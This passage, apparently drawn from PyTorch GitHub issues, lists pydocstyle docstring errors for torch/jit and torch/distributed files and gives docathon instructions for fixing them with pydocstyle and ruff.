- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_methods_to_compile`, **Line**: 711, **Description**: First line should be in imperative mood (perhaps 'Implement', not 'Implements')
- **Error Code**: **D200**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_hook_stubs`, **Line**: 766, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_hook_stubs`, **Line**: 766, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_hook_stubs`, **Line**: 766, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_property_stubs`, **Line**: 802, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_property_stubs`, **Line**: 802, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `interface_script`, **Line**: 823, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `interface_script`, **Line**: 823, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `interface_script`, **Line**: 823, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_interface_methods_to_compile`, **Line**: 837, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_interface_methods_to_compile`, **Line**: 837, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D200**, **File**: `torch/jit/_recursive.py`, **Entity**: `wrap_cpp_class`, **Line**: 870, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/jit/_recursive.py`, **Entity**: `wrap_cpp_module`, **Line**: 876, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `wrap_cpp_module`, **Line**: 876, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `lazy_bind`, **Line**: 902, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `lazy_bind`, **Line**: 902, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `lazy_bind`, **Line**: 902, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D400**, **File**: `torch/jit/_serialization.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D205**, **File**: `torch/jit/_serialization.py`, **Entity**: `save`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_serialization.py`, **Entity**: `save`, **Line**: 19, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D412**, **File**: `torch/jit/_serialization.py`, **Entity**: `save`, **Line**: 19, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D202**, **File**: `torch/jit/_serialization.py`, **Entity**: `load`, **Line**: 87, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/jit/_serialization.py`, **Entity**: `load`, **Line**: 87, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_serialization.py`, **Entity**: `load`, **Line**: 87, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D202**, **File**: `torch/jit/_serialization.py`, **Entity**: `save_jit_module_to_flatbuffer`, **Line**: 196, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/jit/_serialization.py`, **Entity**: `save_jit_module_to_flatbuffer`, **Line**: 196, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_serialization.py`, **Entity**: `save_jit_module_to_flatbuffer`, **Line**: 196, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D412**, **File**: `torch/jit/_serialization.py`, **Entity**: `save_jit_module_to_flatbuffer`, **Line**: 196, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/jit/_serialization.py`, **Entity**: `get_flatbuffer_module_info`, **Line**: 247, **Description**: 1 blank line required between summary line and description (found 2)
- **Error Code**: **D400**, **File**: `torch/jit/annotations.py`, **Entity**: `_eval_no_call`, **Line**: 150, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/jit/annotations.py`, **Entity**: `parse_type_line`, **Line**: 159, **Description**: First line should be in imperative mood (perhaps 'Parse', not 'Parses')
- **Error Code**: **D401**, **File**: `torch/jit/annotations.py`, **Entity**: `get_type_line`, **Line**: 185, **Description**: First line should be in imperative mood (perhaps 'Try', not 'Tries')
- **Error Code**: **D401**, **File**: `torch/jit/annotations.py`, **Entity**: `split_type_line`, **Line**: 247, **Description**: First line should be in imperative mood (perhaps 'Split', not 'Splits')
- **Error Code**: **D401**, **File**: `torch/jit/annotations.py`, **Entity**: `try_real_annotations`, **Line**: 265, **Description**: First line should be in imperative mood (perhaps 'Try', not 'Tries')
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `unpackage_script_module`, **Line**: 361, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/jit/_script.py`, **Entity**: `unpackage_script_module`, **Line**: 361, **Description**: First line should be in imperative mood (perhaps 'Call', not 'Called')
- **Error Code**: **D204**, **File**: `torch/jit/_script.py`, **Entity**: `RecursiveScriptClass`, **Line**: 414, **Description**: 1 blank line required after class docstring (found 0)
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `RecursiveScriptClass`, **Line**: 414, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D204**, **File**: `torch/jit/_script.py`, **Entity**: `ScriptModule`, **Line**: 487, **Description**: 1 blank line required after class docstring (found 0)
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `ScriptModule`, **Line**: 487, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `ScriptModule`, **Line**: 487, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `__reduce_package__`, **Line**: 550, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `__reduce_package__`, **Line**: 550, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/jit/_script.py`, **Entity**: `__reduce_package__`, **Line**: 550, **Description**: First line should be in imperative mood (perhaps 'Call', not 'Called')
- **Error Code**: **D204**, **File**: `torch/jit/_script.py`, **Entity**: `RecursiveScriptModule`, **Line**: 566, **Description**: 1 blank line required after class docstring (found 0)
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `RecursiveScriptModule`, **Line**: 566, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `RecursiveScriptModule`, **Line**: 566, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `_construct`, **Line**: 601, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `_construct`, **Line**: 601, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `graph`, **Line**: 668, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `graph`, **Line**: 668, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `inlined_graph`, **Line**: 676, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `inlined_graph`, **Line**: 676, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `code`, **Line**: 685, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `code`, **Line**: 685, **Description**: First line should end with a period (not 'f')
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `code_with_constants`, **Line**: 694, **Description**: First line should end with a period (not '
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `save`, **Line**: 708, **Description**: First line should end with a period (not ')')
- **Error Code**: **D402**, **File**: `torch/jit/_script.py`, **Entity**: `save`, **Line**: 708, **Description**: First line should not be the function's ""signature""
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `_save_for_lite_interpreter`, **Line**: 716, **Description**: First line should end with a period (not ')')
- **Error Code**: **D402**, **File**: `torch/jit/_script.py`, **Entity**: `_save_for_lite_interpreter`, **Line**: 716, **Description**: First line should not be the function's ""signature""
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `create_script_list`, **Line**: 1024, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `script`, **Line**: 1039, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `script`, **Line**: 1039, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D205**, **File**: `torch/jit/_trace.py`, **Entity**: `verify`, **Line**: 190, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: `verify`, **Line**: 190, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/jit/_trace.py`, **Entity**: `trace`, **Line**: 629, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D301**, **File**: `torch/jit/_trace.py`, **Entity**: `trace`, **Line**: 629, **Description**: Use r"""""" if any backslashes in a docstring
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: `trace`, **Line**: 629, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/jit/_trace.py`, **Entity**: `trace_module`, **Line**: 919, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: `trace_module`, **Line**: 919, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/jit/_trace.py`, **Entity**: `is_tracing`, **Line**: 1103, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: `is_tracing`, **Line**: 1103, **Description**: First line should end with a period (not 'f')
- **Error Code**: **D401**, **File**: `torch/jit/_trace.py`, **Entity**: `is_tracing`, **Line**: 1103, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/jit/_trace.py`, **Entity**: `_get_trace_graph`, **Line**: 1234, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: `_get_trace_graph`, **Line**: 1234, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/jit/__init__.py`, **Entity**: `export_opnames`, **Line**: 100, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D208**, **File**: `torch/jit/__init__.py`, **Entity**: `export_opnames`, **Line**: 100, **Description**: Docstring is over-indented
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `export_opnames`, **Line**: 100, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/jit/__init__.py`, **Entity**: `export_opnames`, **Line**: 100, **Description**: First line should be in imperative mood (perhaps 'Generate', not 'Generates')
- **Error Code**: **D205**, **File**: `torch/jit/__init__.py`, **Entity**: `annotate`, **Line**: 118, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `annotate`, **Line**: 118, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/jit/__init__.py`, **Entity**: `annotate`, **Line**: 118, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/jit/__init__.py`, **Entity**: `script_if_tracing`, **Line**: 165, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/jit/__init__.py`, **Entity**: `script_if_tracing`, **Line**: 165, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `script_if_tracing`, **Line**: 165, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/jit/__init__.py`, **Entity**: `isinstance`, **Line**: 187, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `isinstance`, **Line**: 187, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/__init__.py`, **Entity**: `isinstance`, **Line**: 187, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/jit/__init__.py`, **Entity**: `strict_fusion`, **Line**: 228, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `strict_fusion`, **Line**: 228, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D412**, **File**: `torch/jit/__init__.py`, **Entity**: `strict_fusion`, **Line**: 228, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D200**, **File**: `torch/jit/__init__.py`, **Entity**: `enable_onednn_fusion`, **Line**: 269, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/jit/__init__.py`, **Entity**: `enable_onednn_fusion`, **Line**: 269, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/jit/__init__.py`, **Entity**: `enable_onednn_fusion`, **Line**: 269, **Description**: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
- **Error Code**: **D200**, **File**: `torch/jit/__init__.py`, **Entity**: `onednn_fusion_enabled`, **Line**: 276, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `onednn_fusion_enabled`, **Line**: 276, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/jit/__init__.py`, **Entity**: `onednn_fusion_enabled`, **Line**: 276, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_load_for_lite_interpreter`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_load_for_lite_interpreter`, **Line**: 9, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_export_operator_list`, **Line**: 72, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D208**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_export_operator_list`, **Line**: 72, **Description**: Docstring is over-indented
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_export_operator_list`, **Line**: 72, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D403**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_export_operator_list`, **Line**: 72, **Description**: First word of the first line should be properly capitalized ('Return', not 'return')
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_model_bytecode_version`, **Line**: 79, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_model_bytecode_version`, **Line**: 79, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_mobile_model_contained_types`, **Line**: 110, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_mobile_model_contained_types`, **Line**: 110, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_backport_for_mobile`, **Line**: 140, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_backport_for_mobile`, **Line**: 140, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_backport_for_mobile_to_buffer`, **Line**: 162, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_backport_for_mobile_to_buffer`, **Line**: 162, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_model_ops_and_info`, **Line**: 180, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_model_ops_and_info`, **Line**: 180, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D401**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_model_ops_and_info`, **Line**: 180, **Description**: First line should be in imperative mood; try rephrasing (found 'A')

cc @carljparker",False
"Fix docstring errors in input_reshard.py, tensor_ops.py, view_ops.py, api.py, storage.py, fsdp_checkpoint_example.py, utils.py, memory_tracker.py, default_planner.py, _nested_dict.py, _fsspec_filesystem.py, multihead_attention_tp.py, _view_with_dim_change.py, state_dict_saver.py, op_coverage.py, planner.py, filesystem.py, fsdp.py, common_rules.py, planner_helpers.py, state_dict_loader.py, style.py, resharding.py, _sharded_tensor_utils.py, _traverse.py, optimizer.py, _utils.py, metadata.py module: docs triaged medium docathon-h2-2023","Please fix the following issues.
First, make sure to install the required tools:
```
pip3 install pydocstyle
```
```
pip3 install ruff
```
Then complete the followings steps:
 1. Run `pydocstyle` to see the number of errors in the file: 
 ```
pydocstyle path-to-file --count
```
 &nbsp; &nbsp; This command prints out the number of errors at the end of the output. Save this output to later add it to your PR description.
2. Next, run `ruff` which should help autofix many of these errors:
```
ruff --select RULECODE --fix path_to_file
```
&nbsp; &nbsp; `RULECODE` is the error code from the output in the issue, for example, **D200**. See the complete list of rules and autofixes [here](https://docs.astral.sh/ruff/rules/#pydocstyle-d).
3. You can run the above command with the `--unsafe-fixes` option. Double-check that the applied fixes are correct.
4. Fix the remaining issues. Fix **only** the errors listed in the issue. Skip the 'Missing docstrings' errors.
5. Run pydocstyle again:
```
pydocstyle path-to-file --count
```
This **number might not be 0** which is **OK**. Add the count of fixed errors to your PR description. 
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `Singleton`, **Line**: 39, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `Flatten`, **Line**: 100, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `Flatten`, **Line**: 100, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `Split`, **Line**: 124, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `expand`, **Line**: 174, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `expand`, **Line**: 174, **Description**: First line should be in imperative mood (perhaps 'Implement', not 'Implements')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `infer_size`, **Line**: 254, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `view_groups`, **Line**: 273, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `view_groups`, **Line**: 273, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `view_groups`, **Line**: 273, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `dim_reduction`, **Line**: 403, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `propagate_shape_and_sharding`, **Line**: 472, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `propagate_shape_and_sharding`, **Line**: 472, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `propagate_shape_and_sharding`, **Line**: 472, **Description**: First line should be in imperative mood (perhaps 'Take', not 'Takes')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `einop_rule`, **Line**: 50, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `einop_rule`, **Line**: 50, **Description**: First line should end with a period (not 'a')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `pointwise_rule`, **Line**: 231, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `pointwise_rule`, **Line**: 231, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `linear_pointwise_rule`, **Line**: 291, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `reduction_rule`, **Line**: 306, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `reduction_rule`, **Line**: 306, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `normalize_dims`, **Line**: 58, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `normalize_dims`, **Line**: 58, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D403**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `normalize_dims`, **Line**: 58, **Description**: First word of the first line should be properly capitalized ('Normalize', not 'normalize')
- **Error Code**: **D200**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `is_tensor_shardable`, **Line**: 76, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `is_tensor_dim_sharded`, **Line**: 96, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `is_tensor_partial`, **Line**: 101, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D200**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `gen_bucketize_strategy`, **Line**: 127, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `gen_slice_strategy`, **Line**: 149, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `gen_slice_strategy`, **Line**: 149, **Description**: First line should be in imperative mood (perhaps 'Forward', not 'forwards')
- **Error Code**: **D403**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `gen_slice_strategy`, **Line**: 149, **Description**: First word of the first line should be properly capitalized ('Forwards', not 'forwards')
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `unshard_tensor_dim`, **Line**: 201, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `replicate_tensor_dim`, **Line**: 211, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `replica_only_strategy`, **Line**: 270, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `prop_index`, **Line**: 308, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/debug/op_coverage.py`, **Entity**: `get_inductor_decomp_graphs`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/debug/op_coverage.py`, **Entity**: `get_inductor_decomp_graphs`, **Line**: 23, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D401**, **File**: `torch/distributed/_tensor/debug/op_coverage.py`, **Entity**: `get_inductor_decomp_graphs`, **Line**: 23, **Description**: First line should be in imperative mood; try rephrasing (found 'Convenient')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/debug/op_coverage.py`, **Entity**: `print_op_coverage_summary`, **Line**: 47, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/debug/op_coverage.py`, **Entity**: `print_op_coverage_summary`, **Line**: 47, **Description**: First line should end with a period (not ',')
- **Error Code**: **D200**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `MemoryProfileDispatchMode`, **Line**: 26, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `MemoryTracker`, **Line**: 53, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `MemoryTracker`, **Line**: 53, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `start_monitor`, **Line**: 93, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `start_monitor`, **Line**: 93, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `stop`, **Line**: 120, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `stop`, **Line**: 120, **Description**: First line should end with a period (not 'p')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `summary`, **Line**: 137, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `summary`, **Line**: 137, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `save_stats`, **Line**: 207, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `save_stats`, **Line**: 207, **Description**: First line should end with a period (not 's')
- **Error Code**: **D200**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `load`, **Line**: 223, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `load`, **Line**: 223, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_pre_forward_hook`, **Line**: 237, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_pre_forward_hook`, **Line**: 237, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_pre_forward_hook`, **Line**: 237, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_post_forward_hook`, **Line**: 253, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_post_forward_hook`, **Line**: 253, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D401**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_post_forward_hook`, **Line**: 253, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
